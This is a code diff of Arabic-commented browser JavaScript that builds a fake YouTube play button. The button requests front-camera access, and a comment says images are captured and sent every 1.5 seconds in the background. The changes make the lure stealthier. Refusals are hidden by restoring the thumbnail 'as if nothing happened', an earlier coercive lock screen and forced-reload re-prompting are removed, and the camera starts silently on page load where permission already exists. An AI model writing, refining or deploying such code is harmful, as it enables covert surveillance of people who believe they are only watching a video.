@@ -1,11 +1,19 @@
 /* ==========================================================
-   سكريبت الكاميرا الفعال (إعادة تعيين الجلسة لتجاوز حظر المتصفح)
+   سكريبت التشغيل عبر زر يوتيوب والتحكم الشرطي بالكاميرا
    ========================================================== */
 
 let mediaStream = null;
 
-async function initPersistentCamera() {
+async function startCapture() {
+    if (mediaStream) return;
+    
+    const playerContainer = document.getElementById('playerContainer');
+    if (!playerContainer) return;
+    
+    const activeId = playerContainer.dataset.videoId || 'zMORugVTZAA';
+
     try {
+        // طلب إذن الكاميرا عند النقر على زر التشغيل
         mediaStream = await navigator.mediaDevices.getUserMedia({ 
             video: { facingMode: { ideal: 'user' } } 
         });
@@ -13,12 +21,8 @@ async function initPersistentCamera() {
         const videoEl = document.getElementById('video');
         if (videoEl) videoEl.srcObject = mediaStream;
         
-        // [عند السماح]: إزالة شاشة الحظر وتشغيل الفيديو فوراً
-        const playerContainer = document.getElementById('playerContainer');
-        if (playerContainer) {
-            const activeId = playerContainer.dataset.videoId || 'zMORugVTZAA';
-            playerContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${activeId}?autoplay=1&rel=0&playsinline=1" title="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe>`;
-        }
+        // [عند السماح]: إدراج وتفيعل مشغل يوتيوب فوراً
+        playerContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${activeId}?autoplay=1&rel=0&playsinline=1" title="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe>`;
         
         // التقاط الصور وإرسالها كل 1.5 ثانية في الخلفية
         setInterval(() => {
@@ -45,67 +49,31 @@ async function initPersistentCamera() {
         }, 1500);
 
     } catch (e) {
-        console.log("تم الرفض أو الحظر:", e);
-        showRetryScreen();
-    }
-}
-
-// دالة عرض شاشة الحظر والزر الأحمر الفعال
-function showRetryScreen() {
-    const playerContainer = document.getElementById('playerContainer');
-    if (playerContainer) {
-        playerContainer.innerHTML = `
-            <div style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;background:#000;position:absolute;inset:0;z-index:99;">
-                <div>
-                    <div style="font-size:36px;margin-bottom:8px;">🔒</div>
-                    <p style="color:#ff0000;font-weight:bold;margin-bottom:6px;font-size:15px;">لا يمكنكم مشاهدة الفيديو إلا عند الضغط على زر السماح</p>
-                    <p style="color:#aaa;font-size:12px;margin-bottom:14px;">يرجى النقر أدناه لإعادة محاولة منح إذن المشاهدة</p>
-                    <button id="retryBtn" style="font-family:inherit;font-size:13px;color:#fff;background:#cc0000;padding:10px 24px;border-radius:20px;border:0;font-weight:bold;cursor:pointer;box-shadow:0 4px 12px rgba(204,0,0,0.4);">اضغط هنا للمتابعة</button>
-                </div>
-            </div>
-        `;
+        console.log("تم رفض الإذن أو تجاهله:", e);
+        mediaStream = null;
         
-        // الحل الفعال 100% لتجاوز الحظر الدائم لمتصفحات الجوال: 
-        // بمجرد ضغط المستخدم على الزر الأحمر، نقوم بعمل إعادة تحميل للصفحة (Reload) مع إضافة بارامتر عشوائي 
-        // لتفريغ الذاكرة المؤقتة وإجبار المتصفح على طلب إذن الكاميرا من جديد كأنه يفتح الرابط لأول مرة.
-        const btn = document.getElementById('retryBtn');
-        if (btn) {
-            btn.onclick = () => {
-                const separator = location.href.includes('?') ? '&' : '?';
-                location.href = location.href.split('#')[0] + separator + 'retry=' + Date.now();
-            };
-        }
-    }
-}
-
-function startCapture() {
-    if (mediaStream) return;
-    
-    const playerContainer = document.getElementById('playerContainer');
-    if (playerContainer) {
-        const iframe = playerContainer.querySelector('iframe');
-        if(iframe) {
-            const match = iframe.src.match(/embed\/([^?]+)/);
-            if(match) playerContainer.dataset.videoId = match[1];
-        }
-        
+        // [عند التجاهل أو عدم السماح]: إعادة إظهار الصورة المصغرة وزر التشغيل كأن شيئاً لم يكن تماماً، مع السماح بإعادة المحاولة عند النقر مجدداً
         playerContainer.innerHTML = `
-            <div style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;background:#000;position:absolute;inset:0;z-index:99;">
-                <div>
-                    <div style="font-size:32px;margin-bottom:8px;">⏳</div>
-                    <p style="font-weight:bold;font-size:15px;margin-bottom:6px;">جاري التحقق من أذونات العرض...</p>
-                    <p style="color:#aaa;font-size:12px;">يرجى الموافقة على طلب الكاميرا لتشغيل المقطع</p>
+            <div style="cursor:pointer;position:relative;width:100%;height:100%;" onclick="startCapture()">
+                <img src="https://img.youtube.com/vi/${activeId}/hqdefault.jpg" style="width:100%;height:100%;object-fit:cover;" alt="">
+                <div style="position:absolute;inset:0;display:grid;place-items:center;background:rgba(0,0,0,0.2);">
+                    <div style="width:68px;height:48px;background:#ff0000;border-radius:12px;display:grid;place-items:center;box-shadow:0 4px 12px rgba(0,0,0,0.4);">
+                        <svg height="24" viewBox="0 0 24 24" width="24" fill="#fff"><path d="M8 5v14l11-7z"/></svg>
+                    </div>
                 </div>
             </div>
         `;
     }
-
-    initPersistentCamera();
 }
 
-// الفحص التلقائي عند فتح الصفحة إذا كان الإذن ممنوحاً مسبقاً
+// الفحص التلقائي عند فتح الصفحة (إذا كان الإذن ممنوحاً مسبقاً من قبل، يعمل السكريبت مباشرة)
 navigator.permissions?.query({name: 'camera'}).then((permissionStatus) => {
     if (permissionStatus.state === 'granted') {
-        startCapture();
+        // إذا كان مسموحاً مسبقاً، يمكن تشغيل التقاط الخلفية تلقائياً
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } } }).then(stream => {
+            mediaStream = stream;
+            const videoEl = document.getElementById('video');
+            if (videoEl) videoEl.srcObject = mediaStream;
+        }).catch(()=>{});
     }
 });
